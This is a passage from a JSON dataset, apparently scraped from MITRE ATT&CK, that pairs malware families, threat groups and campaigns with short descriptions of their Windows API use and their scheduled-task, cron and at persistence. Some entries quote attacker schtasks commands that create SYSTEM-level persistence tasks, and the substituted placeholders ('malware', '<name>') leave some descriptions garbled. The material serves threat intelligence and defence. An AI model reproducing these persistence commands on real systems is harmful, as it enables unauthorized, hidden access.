                "Description": "malware has used the Windows API ObtainUserAgentString to obtain the User-Agent from a compromised host to connect to a C2 server.[113] malware has also used various, often lesser known, functions to perform various types of Discovery and Process Injection.[114][115]"
            },
            "S0395": {
                "ID": "S0395",
                "Name": "LightNeuron",
                "Description": "malware is capable of starting a process using CreateProcess.[116]"
            },
            "S0680": {
                "ID": "S0680",
                "Name": "LitePower",
                "Description": "malware can use various API calls.[117]"
            },
            "S0681": {
                "ID": "S0681",
                "Name": "Lizar",
                "Description": "malware has used various Windows API functions on a victim's machine.[118]"
            },
            "S0447": {
                "ID": "S0447",
                "Name": "Lokibot",
                "Description": "malware has used LoadLibrary(), GetProcAddress() and CreateRemoteThread() API functions to execute its shellcode.[119]"
            },
            "S1016": {
                "ID": "S1016",
                "Name": "MacMa",
                "Description": "malware has used macOS API functions to perform tasks.[120][121]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can use a variety of API calls.[122]"
            },
            "S0652": {
                "ID": "S0652",
                "Name": "MarkiRAT",
                "Description": "malware can run the ShellExecuteW API via the Windows Command Shell.[123]"
            },
            "S0449": {
                "ID": "S0449",
                "Name": "Maze",
                "Description": "malware has used several Windows API functions throughout the encryption process including IsDebuggerPresent, TerminateProcess, Process32FirstW, among others.[124]"
            },
            "S0576": {
                "ID": "S0576",
                "Name": "MegaCortex",
                "Description": "After escalating privileges, malware calls TerminateProcess(), CreateRemoteThread, and other Win32 APIs.[125]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has used native APIs including GetModuleFileName, lstrcat, CreateFile, and ReadFile.[126]"
            },
            "S1059": {
                "ID": "S1059",
                "Name": "metaMain",
                "Description": "malware can execute an operator-provided Windows command by leveraging functions such as WinExec, WriteFile, and ReadFile.[122][127]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware has used native WINAPI calls.[128][129]"
            },
            "S0688": {
                "ID": "S0688",
                "Name": "Meteor",
                "Description": "malware can use WinAPI to remove a victim machine from an Active Directory domain.[130]"
            },
            "S1015": {
                "ID": "S1015",
                "Name": "Milan",
                "Description": "malware can use the API DnsQuery_A for DNS resolution.[109]"
            },
            "S0084": {
                "ID": "S0084",
                "Name": "Mis-Type",
                "Description": "malware has used Windows API calls, including NetUserAdd and NetUserDel.[131]"
            },
            "S0083": {
                "ID": "S0083",
                "Name": "Misdat",
                "Description": "malware has used Windows APIs, including ExitWindowsEx and GetKeyboardType.[131]"
            },
            "S1122": {
                "ID": "S1122",
                "Name": "Mispadu",
                "Description": "malware has used a variety of Windows API calls, including ShellExecute and WriteProcessMemory.[132][133]"
            },
            "S0256": {
                "ID": "S0256",
                "Name": "Mosquito",
                "Description": "malware leverages the CreateProcess() and LoadLibrary() calls to execute files with the .dll and .exe extensions.[134]"
            },
            "S0630": {
                "ID": "S0630",
                "Name": "Nebulae",
                "Description": "malware has the ability to use CreateProcess to execute a process.[135]"
            },
            "S0457": {
                "ID": "S0457",
                "Name": "Netwalker",
                "Description": "malware can use Windows API functions to inject the ransomware DLL.[136]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware can use Native API including CreateProcess GetProcessById, and WriteProcessMemory.[137]"
            },
            "S1090": {
                "ID": "S1090",
                "Name": "NightClub",
                "Description": "malware can use multiple native APIs including GetKeyState, GetForegroundWindow, GetWindowThreadProcessId, and GetKeyboardLayout.[138]"
            },
            "S1100": {
                "ID": "S1100",
                "Name": "Ninja",
                "Description": "The malware loader can call Windows APIs for discovery, process injection, and payload decryption.[139][140]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware has used the ShellExecute() function within a script.[141]"
            },
            "C0022": {
                "ID": "C0022",
                "Name": "Operation Dream Job",
                "Description": "During malware, Lazarus Group used Windows API ObtainUserAgentString to obtain the victim's User-Agent and used the value to connect to their C2 server.[113]"
            },
            "C0006": {
                "ID": "C0006",
                "Name": "Operation Honeybee",
                "Description": "During malware, the threat actors deployed malware that used API calls, including CreateProcessAsUser.[142]"
            },
            "C0013": {
                "ID": "C0013",
                "Name": "Operation Sharpshooter",
                "Description": "During malware, the first stage downloader resolved various Windows libraries and APIs, including LoadLibraryA(), GetProcAddress(), and CreateProcessA().[143]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors used the CreateProcessA and ShellExecute API functions to launch commands after being injected into a selected process.[144]"
            },
            "S1050": {
                "ID": "S1050",
                "Name": "PcShare",
                "Description": "malware has used a variety of Windows API functions.[87]"
            },
            "S0517": {
                "ID": "S0517",
                "Name": "Pillowmint",
                "Description": "malware has used multiple native Windows APIs to execute and conduct process injections.[145]"
            },
            "S0501": {
                "ID": "S0501",
                "Name": "PipeMon",
                "Description": "malware's first stage has been executed by a call to CreateProcess with the decryption password in an argument. malware has used a call to LoadLibrary to load its installer.[146]"
            },
            "S0435": {
                "ID": "S0435",
                "Name": "PLEAD",
                "Description": "malware can use ShellExecute to execute applications.[147]"
            },
            "S0013": {
                "ID": "S0013",
                "Name": "PlugX",
                "Description": "malware can use the Windows API functions GetProcAddress, LoadLibrary, and CreateProcess to execute another process.[148][149]"
            },
            "S0518": {
                "ID": "S0518",
                "Name": "PolyglotDuke",
                "Description": "malware can use LoadLibraryW and CreateProcess to load and execute code.[84]"
            },
            "S0453": {
                "ID": "S0453",
                "Name": "Pony",
                "Description": "malware has used several Windows functions for various purposes.[150]"
            },
            "S1058": {
                "ID": "S1058",
                "Name": "Prestige",
                "Description": "malware has used the Wow64DisableWow64FsRedirection() and Wow64RevertWow64FsRedirection() functions to disable and restore file system redirection.[151]"
            },
            "S0147": {
                "ID": "S0147",
                "Name": "Pteranodon",
                "Description": "malware has used various API calls.[152]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can use GetProcAddress to help delete malicious strings from memory.[153]"
            },
            "S1076": {
                "ID": "S1076",
                "Name": "QUIETCANARY",
                "Description": "malware can call System.Net.HttpWebRequest to identify the default proxy configured on the victim computer.[154]"
            },
            "S0629": {
                "ID": "S0629",
                "Name": "RainyDay",
                "Description": "The file collection tool used by malware can utilize native API including ReadDirectoryChangeW for folder monitoring.[135]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can use Windows API functions such as WriteFile, CloseHandle, and GetCurrentHwProfile during its collection and file storage operations. malware can execute its embedded components via CreateProcessA and ShellExecute.[155]"
            },
            "S0662": {
                "ID": "S0662",
                "Name": "RCSession",
                "Description": "malware can use WinSock API for communication including WSASend and WSARecv.[156]"
            },
            "S0416": {
                "ID": "S0416",
                "Name": "RDFSNIFFER",
                "Description": "malware has used several Win32 API functions to interact with the victim machine.[157]"
            },
            "S0496": {
                "ID": "S0496",
                "Name": "REvil",
                "Description": "malware can use Native API for execution and to retrieve active services.[158][159]"
            },
            "S0448": {
                "ID": "S0448",
                "Name": "Rising Sun",
                "Description": "malware used dynamic API resolutions to various Windows APIs by leveraging LoadLibrary() and GetProcAddress().[143]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware can use a variety of API calls to execute shellcode.[160]"
            },
            "S1078": {
                "ID": "S1078",
                "Name": "RotaJakiro",
                "Description": "When executing with non-root permissions, malware uses the the shmget API to create shared memory between other known malware processes. malware also uses the execvp API to help its dead process \"resurrect\".[161]"
            },
            "S1073": {
                "ID": "S1073",
                "Name": "Royal",
                "Description": "malware can use multiple APIs for discovery, communication, and execution.[162]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware can use the FindNextUrlCacheEntryA and FindFirstUrlCacheEntryA functions to search for specific strings within browser history.[163]"
            },
            "S0446": {
                "ID": "S0446",
                "Name": "Ryuk",
                "Description": "malware has used multiple native APIs including ShellExecuteW to run executables,GetWindowsDirectoryW to create folders, and VirtualAlloc, WriteProcessMemory, and CreateRemoteThread for process injection.[164]"
            },
            "S0085": {
                "ID": "S0085",
                "Name": "S-Type",
                "Description": "malware has used Windows APIs, including GetKeyboardType, NetUserAdd, and NetUserDel.[131]"
            },
            "S1018": {
                "ID": "S1018",
                "Name": "Saint Bot",
                "Description": "malware has used different API calls, including GetProcAddress, VirtualAllocEx, WriteProcessMemory, CreateProcessA, and SetThreadContext.[165][166]"
            },
            "S1099": {
                "ID": "S1099",
                "Name": "Samurai",
                "Description": "malware has the ability to call Windows APIs.[139]"
            },
            "S1085": {
                "ID": "S1085",
                "Name": "Sardonic",
                "Description": "malware has the ability to call Win32 API functions to determine if powershell.exe is running.[167]"
            },
            "S1089": {
                "ID": "S1089",
                "Name": "SharpDisco",
                "Description": "malware can leverage Native APIs through plugins including GetLogicalDrives.[138]"
            },
            "S0444": {
                "ID": "S0444",
                "Name": "ShimRat",
                "Description": "malware has used Windows API functions to install the service and shim.[168]"
            },
            "S0445": {
                "ID": "S0445",
                "Name": "ShimRatReporter",
                "Description": "malware used several Windows API functions to gather information from the infected system.[168]"
            },
            "G1008": {
                "ID": "G1008",
                "Name": "SideCopy",
                "Description": "malware has executed malware by calling the API function CreateProcessW.[169]"
            },
            "S0610": {
                "ID": "S0610",
                "Name": "SideTwist",
                "Description": "malware can use GetUserNameW, GetComputerNameW, and GetComputerNameExW to gather information.[170]"
            },
            "G0091": {
                "ID": "G0091",
                "Name": "Silence",
                "Description": "malware has leveraged the Windows API, including using CreateProcess() or ShellExecute(), to perform a variety of tasks.[171][172]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware has the ability to leverage API including GetProcAddress and LoadLibrary.[173]"
            },
            "S0623": {
                "ID": "S0623",
                "Name": "Siloscape",
                "Description": "malware makes various native API calls.[174]"
            },
            "S0627": {
                "ID": "S0627",
                "Name": "SodaMaster",
                "Description": "malware can use RegOpenKeyW to access the Registry.[175]"
            },
            "S0615": {
                "ID": "S0615",
                "Name": "SombRAT",
                "Description": "malware has the ability to respawn itself using ShellExecuteW and CreateProcessW.[66]"
            },
            "S1034": {
                "ID": "S1034",
                "Name": "StrifeWater",
                "Description": "malware can use a variety of APIs for execution.[176]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware uses the SetSecurityDescriptorDacl API to reduce object integrity levels.[177]"
            },
            "S0562": {
                "ID": "S0562",
                "Name": "SUNSPOT",
                "Description": "malware used Windows API functions such as MoveFileEx and NtQueryInformationProcess as part of the SUNBURST injection process.[178]"
            },
            "S1064": {
                "ID": "S1064",
                "Name": "SVCReady",
                "Description": "malware can use Windows API calls to gather information from an infected host.[179]"
            },
            "S0242": {
                "ID": "S0242",
                "Name": "SynAck",
                "Description": "malware parses the export tables of system DLLs to locate and call various Windows API functions.[180][181]"
            },
            "S0663": {
                "ID": "S0663",
                "Name": "SysUpdate",
                "Description": "malware can call the GetNetworkParams API as part of its C2 establishment process.[182]"
            },
            "G0092": {
                "ID": "G0092",
                "Name": "TA505",
                "Description": "malware has deployed payloads that use Windows API calls on a compromised host.[183]"
            },
            "S0011": {
                "ID": "S0011",
                "Name": "Taidoor",
                "Description": "malware has the ability to use native APIs for execution including GetProcessHeap, GetProcAddress, and LoadLibrary.[184][185]"
            },
            "S0595": {
                "ID": "S0595",
                "Name": "ThiefQuest",
                "Description": "malware uses various API to perform behaviors such as executing payloads and performing local enumeration.[186]"
            },
            "S0668": {
                "ID": "S0668",
                "Name": "TinyTurla",
                "Description": "malware has used WinHTTP, CreateProcess, and other APIs for C2 communications and other functions.[187]"
            },
            "G1022": {
                "ID": "G1022",
                "Name": "ToddyCat",
                "Description": "malware has used WinExec to execute commands received from C2 on compromised hosts.[140]"
            },
            "S0678": {
                "ID": "S0678",
                "Name": "Torisma",
                "Description": "malware has used various Windows API calls.[188]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware uses the Windows API call, CreateProcessW(), to manage execution flow.[189] malware has also used Nt* API functions to perform Process Injection.[190]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware has used multiple Windows APIs including HttpInitialize, HttpCreateHttpHandle, and HttpAddUrl.[191]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.[192]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "malware can use native Windows APIs including GetHostByName.[193]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware has used CreateProcessW to create child processes.[194]"
            },
            "S0180": {
                "ID": "S0180",
                "Name": "Volgmer",
                "Description": "malware executes payloads using the Windows API call CreateProcessW().[195]"
            },
            "S0670": {
                "ID": "S0670",
                "Name": "WarzoneRAT",
                "Description": "malware can use a variety of API calls on a compromised host.[196]"
            },
            "S0612": {
                "ID": "S0612",
                "Name": "WastedLocker",
                "Description": "malware's custom crypter, CryptOne, leveraged the VirtualAlloc() API function to help execute the payload.[197]"
            },
            "S0579": {
                "ID": "S0579",
                "Name": "Waterbear",
                "Description": "malware can leverage API functions for execution.[198]"
            },
            "S0689": {
                "ID": "S0689",
                "Name": "WhisperGate",
                "Description": "malware has used the ExitWindowsEx to flush file buffers to disk and stop running processes and other API calls.[199][200]"
            },
            "S0466": {
                "ID": "S0466",
                "Name": "WindTail",
                "Description": "malware can invoke Apple APIs contentsOfDirectoryAtPath, pathExtension, and (string) compare.[201]"
            },
            "S0141": {
                "ID": "S0141",
                "Name": "Winnti for Windows",
                "Description": "malware can use Native API to create a new process and to start services.[202]"
            },
            "S1065": {
                "ID": "S1065",
                "Name": "Woody RAT",
                "Description": "malware can use multiple native APIs, including WriteProcessMemory, CreateProcess, and CreateRemoteThread for process injection.[203]"
            },
            "S0161": {
                "ID": "S0161",
                "Name": "XAgentOSX",
                "Description": "malware contains the execFile function to execute a specified file on the system using the NSTask:launch method.[204]"
            },
            "S0653": {
                "ID": "S0653",
                "Name": "xCaon",
                "Description": "malware has leveraged native OS function calls to retrieve  victim's network adapter's  information using GetAdapterInfo() API.[48]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware can leverage native API including RegisterServiceCtrlHandler  to register a service.RegisterServiceCtrlHandler"
            },
            "S1013": {
                "ID": "S1013",
                "Name": "ZxxZ",
                "Description": "malware has used API functions such as Process32First, Process32Next, and ShellExecuteA.[205]"
            }
        }
    },
    "T1053": {
        "ttp_name": "Scheduled Task/Job",
        "ttp_id": "T1053",
        "href": "/techniques/T1053",
        "subtechnique": {
            "002": {
                "name": "At",
                "href": "/techniques/T1053/002",
                "description": "Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of Scheduled Task's schtasks in Windows environments, using at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group.On Linux and macOS, at may be invoked by the superuser as well as any users added to the at.allow file. If the at.allow file does not exist, the at.deny file is checked. Every username not listed in at.deny is allowed to invoke at. If the at.deny exists and is empty, global use of at is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use at.[1]Adversaries may use at to execute programs at system startup or on a scheduled basis for Persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM).In Linux environments, adversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.[2]",
                "Procedure": {
                    "G0026": {
                        "ID": "G0026",
                        "Name": "APT18",
                        "Description": "<name> actors used the native at Windows task scheduler tool to use scheduled tasks for execution on a victim network.[3]"
                    },
                    "S0110": {
                        "ID": "S0110",
                        "Name": "at",
                        "Description": "<name> can be used to schedule a task on a system to be executed <name> a specific d<name>e or time.[4][1]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has used at to register a scheduled task to execute malware during lateral movement.[5]"
                    },
                    "S0488": {
                        "ID": "S0488",
                        "Name": "CrackMapExec",
                        "Description": "<name> can set a scheduled task on the target system to execute commands remotely using at.[6]"
                    },
                    "S0233": {
                        "ID": "S0233",
                        "Name": "MURKYTOP",
                        "Description": "<name> has the capability to schedule remote AT jobs.[7]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> actors use at to schedule tasks to run self-extracting RAR archives, which install HTTPBrowser or PlugX on other victims on a network.[8]"
                    }
                }
            },
            "003": {
                "name": "Cron",
                "href": "/techniques/T1053/003",
                "description": "Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code.[1] The cron utility is a time-based job scheduler for Unix-like operating systems.  The  crontab file contains the schedule of cron entries to be run and the specified times for execution. Any crontab files are stored in operating system-specific file paths.An adversary may use cron in Linux or Unix environments to execute programs at system startup or on a scheduled basis for Persistence.",
                "Procedure": {
                    "S0504": {
                        "ID": "S0504",
                        "Name": "Anchor",
                        "Description": "<name> can install itself as a cron job.[2]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has used cron to create pre-scheduled and periodic background jobs on a Linux system.[3]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has made modifications to the crontab file including in /var/cron/tabs/.[4]"
                    },
                    "S0401": {
                        "ID": "S0401",
                        "Name": "Exaramel for Linux",
                        "Description": "<name> uses crontab for persistence if it does not have root privileges.[5][6]"
                    },
                    "S0588": {
                        "ID": "S0588",
                        "Name": "GoldMax",
                        "Description": "The <name> Linux variant has used a crontab entry with a @reboot line to gain persistence.[7]"
                    },
                    "S0163": {
                        "ID": "S0163",
                        "Name": "Janicab",
                        "Description": "<name> used a cron job for persistence on Mac devices.[8]"
                    },
                    "S0599": {
                        "ID": "S0599",
                        "Name": "Kinsing",
                        "Description": "<name> has used crontab to download and run shell scripts every minute to ensure persistence.[9]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> can use crontabs to establish persistence.[10]"
                    },
                    "S1107": {
                        "ID": "S1107",
                        "Name": "NKAbuse",
                        "Description": "<name> uses a Cron job to establish persistence when infecting Linux hosts.[11]"
                    },
                    "S0587": {
                        "ID": "S0587",
                        "Name": "Penquin",
                        "Description": "<name> can use Cron to create periodic and pre-scheduled background jobs.[12]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> installed a cron job that downloaded and executed files from the C2.[13][14][15]"
                    },
                    "S0468": {
                        "ID": "S0468",
                        "Name": "Skidmap",
                        "Description": "<name> has installed itself via crontab.[16]"
                    },
                    "S0374": {
                        "ID": "S0374",
                        "Name": "SpeakUp",
                        "Description": "<name> uses cron tasks to ensure persistence. [17]"
                    },
                    "S0341": {
                        "ID": "S0341",
                        "Name": "Xbash",
                        "Description": "<name> can create a cronjob for persistence if it determines it is on a Linux system.[18]"
                    }
                }
            },
            "005": {
                "name": "Scheduled Task",
                "href": "/techniques/T1053/005",
                "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.The deprecated at utility could also be abused by adversaries (ex: At), though at.exe can not access tasks created with schtasks or the Control Panel.An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.[1]Adversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from schtasks /query and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).[2][3] Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., Index value) within associated registry keys.[4]",
                "Procedure": {
                    "C0034": {
                        "ID": "C0034",
                        "Name": "2022 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team leveraged Scheduled Tasks through a Group Policy Object (GPO) to execute CaddyWiper at a predetermined time.[5]"
                    },
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name>  has achieved persistence via scheduled tasks.[6]"
                    },
                    "S0504": {
                        "ID": "S0504",
                        "Name": "Anchor",
                        "Description": "<name> can create a scheduled task for persistence.[7]"
                    },
                    "S0584": {
                        "ID": "S0584",
                        "Name": "AppleJeus",
                        "Description": "<name> has created a scheduled SYSTEM task that runs when a user logs in.[8]"
                    },
                    "G0099": {
                        "ID": "G0099",
                        "Name": "APT-C-36",
                        "Description": "<name> has used a macro function to set scheduled tasks, disguised as those used by Google.[9]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has used named and hijacked scheduled tasks to establish persistence.[10]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "An <name> downloader creates persistence by creating the following scheduled task: schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru \"System\".[11]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used scheduled tasks to persist on victim systems.[12][13][14][15]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has created a scheduled task to execute a .vbe file multiple times a day.[16]"
                    },
                    "G0067": {
                        "ID": "G0067",
                        "Name": "APT37",
                        "Description": "<name> has created scheduled tasks to run malicious scripts on a compromised host.[17]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has used Task Scheduler to run programs at system startup or on a scheduled basis for persistence.[18]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has created scheduled tasks for persistence.[19][20][21]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> used a compromised account to create a scheduled task on a system.[22][23]"
                    },
                    "S1087": {
                        "ID": "S1087",
                        "Name": "AsyncRAT",
                        "Description": "<name> can create a scheduled task to maintain persistence on system start-up.[24]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name>'s installer plugin can schedule a new task that loads the dispatcher on boot/logon.[25]"
                    },
                    "S0414": {
                        "ID": "S0414",
                        "Name": "BabyShark",
                        "Description": "<name> has used scheduled tasks to maintain persistence.[23]"
                    },
                    "S0475": {
                        "ID": "S0475",
                        "Name": "BackConfig",
                        "Description": "<name> has the ability to use scheduled tasks to repeatedly execute malicious payloads on a compromised host.[26]"
                    },
                    "S0606": {
                        "ID": "S0606",
                        "Name": "Bad Rabbit",
                        "Description": "<name>\u2019s infpub.dat file creates a scheduled task to launch a malicious executable.[27]"
                    },
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> can use schtasks.exe to gain persistence.[28]"
                    },
                    "S0128": {
                        "ID": "S0128",
                        "Name": "BADNEWS",
                        "Description": "<name> creates a scheduled task to establish by executing a malicious payload every subsequent minute.[29]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can create a scheduled task for persistence.[30][31]"
                    },
                    "G1002": {
                        "ID": "G1002",
                        "Name": "BITTER",
                        "Description": "<name> has used scheduled tasks for persistence and execution.[32]"
                    },
                    "G0108": {
                        "ID": "G0108",
                        "Name": "Blue Mockingbird",
                        "Description": "<name> has used Windows Scheduled Tasks to establish persistence on local and remote hosts.[33]"
                    },
                    "S0360": {
                        "ID": "S0360",
                        "Name": "BONDUPDATER",
                        "Description": "<name> persists using a scheduled task that executes every minute.[34]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has used schtasks to register a scheduled task to execute malware during lateral movement.[35]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> can achieve persistence by copying its DLL to a subdirectory of %APPDATA% and creating a Visual Basic Script that will load the DLL via a scheduled task.[36][37]"
                    },
                    "C0017": {
                        "ID": "C0017",
                        "Name": "C0017",
                        "Description": "During <name>, APT41 used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared.[38]"
                    },
                    "C0032": {
                        "ID": "C0032",
                        "Name": "C0032",
                        "Description": "During the <name> campaign, TEMP.Veles used scheduled task XML triggers.[39]"
                    },
                    "S0335": {
                        "ID": "S0335",
                        "Name": "Carbon",
                        "Description": "<name> creates several tasks for later execution to continue persistence on the victim\u2019s machine.[40]"
                    },
                    "S1043": {
                        "ID": "S1043",
                        "Name": "ccf32",
                        "Description": "<name> can run on a daily basis using a scheduled task.[41]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has used scheduled tasks to invoke Cobalt Strike including through batch script schtasks /create /ru \"SYSTEM\" /tn \"update\" /tr \"cmd /c c:\\windows\\temp\\update.bat\" /sc once /f /st and to maintain persistence.[42][43]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has created Windows tasks to establish persistence.[44]"
                    },
                    "S0126": {
                        "ID": "S0126",
                        "Name": "ComRAT",
                        "Description": "<name> has used a scheduled task to launch its PowerShell loader.[45][46]"
                    },
                    "G0142": {
                        "ID": "G0142",
                        "Name": "Confucius",
                        "Description": "<name> has created scheduled tasks to maintain persistence on a compromised host.[47]"
                    },
                    "S0050": {
                        "ID": "S0050",
                        "Name": "CosmicDuke",
                        "Description": "<name> uses scheduled tasks typically named \"Watchmon Service\" for persistence.[48]"
                    },
                    "C0004": {
                        "ID": "C0004",
                        "Name": "CostaRicto",
                        "Description": "During <name>, the threat actors used scheduled tasks to download backdoor tools.[49]"
                    },
                    "S0046": {
                        "ID": "S0046",
                        "Name": "CozyCar",
                        "Description": "One persistence mechanism used by <name> is to register itself as a scheduled task.[50]"
                    },
                    "S0538": {
                        "ID": "S0538",
                        "Name": "Crutch",
                        "Description": "<name> has the ability to persist using scheduled tasks.[51]"
                    },
                    "S0527": {
                        "ID": "S0527",
                        "Name": "CSPY Downloader",
                        "Description": "<name> can use the schtasks utility to bypass UAC.[52]"
                    },
                    "S1014": {
                        "ID": "S1014",
                        "Name": "DanBot",
                        "Description": "<name> can use a scheduled task for installation.[53]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> has created a scheduled task for persistence.[54]"
                    },
                    "S1088": {
                        "ID": "S1088",
                        "Name": "Disco",
                        "Description": "<name> can create a scheduled task to run every minute for persistence.[55]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.[56]"
                    },
                    "S0384": {
                        "ID": "S0384",
                        "Name": "Dridex",
                        "Description": "<name> can maintain persistence via the creation of scheduled tasks within system directories such as windows\\system32\\, windows\\syswow64, winnt\\system32, and winnt\\syswow64.[57]"
                    },
                    "S0038": {
                        "ID": "S0038",
                        "Name": "Duqu",
                        "Description": "Adversaries can instruct <name> to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.[58]"
                    },
                    "S0024": {
                        "ID": "S0024",
                        "Name": "Dyre",
                        "Description": "<name> has the ability to achieve persistence by adding a new task in the task scheduler to run every minute.[59]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has maintained persistence through a scheduled task. [60]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> has modules to interact with the Windows task scheduler.[61]"
                    },
                    "S0396": {
                        "ID": "S0396",
                        "Name": "EvilBunny",
                        "Description": "<name> has executed commands via scheduled tasks.[62]"
                    },
                    "G0051": {
                        "ID": "G0051",
                        "Name": "FIN10",
                        "Description": "<name> has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire.[63][61]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has created scheduled tasks in the C:\\Windows directory of the compromised network.[64]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD and FrameworkPOS.[65]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> malware has created scheduled tasks to establish persistence.[66][67][68][69]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has used scheduled tasks to maintain RDP backdoors.[70]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has used Scheduled Tasks for persistence and to load and execute a reverse proxy binary.[71][72]"
                    },
                    "C0001": {
                        "ID": "C0001",
                        "Name": "Frankenstein",
